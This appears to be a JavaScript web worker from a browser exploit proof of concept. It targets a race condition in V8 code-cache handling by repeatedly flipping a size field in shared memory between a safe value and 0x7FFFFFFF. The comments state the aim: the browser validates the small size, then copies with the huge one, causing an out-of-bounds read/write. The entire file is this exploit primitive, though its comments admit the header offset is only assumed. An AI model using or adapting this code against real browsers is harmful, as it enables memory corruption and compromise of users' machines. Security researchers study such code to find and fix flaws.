// mutator.js

onmessage = function(e) {
    const sharedBuffer = e.data.sharedArray;
    const view = new DataView(sharedBuffer);

    console.log("[Worker] Starting mutation loop...");

    // The offset of the size field depends on the exact V8 CodeCache header struct.
    // For this example, we assume the payload size is at offset 4.
    const SIZE_OFFSET = 4;
    
    const SAFE_SIZE = 0x50;
    const MASSIVE_UNSAFE_SIZE = 0x7FFFFFFF; // Will cause an OOB Read/Write

    // Spin infinitely, flipping the size back and forth.
    // We want the Browser to read SAFE_SIZE during validation, 
    // and MASSIVE_UNSAFE_SIZE during the memcpy().
    while (true) {
        view.setUint32(SIZE_OFFSET, SAFE_SIZE, true);
        view.setUint32(SIZE_OFFSET, MASSIVE_UNSAFE_SIZE, true);
    }
};
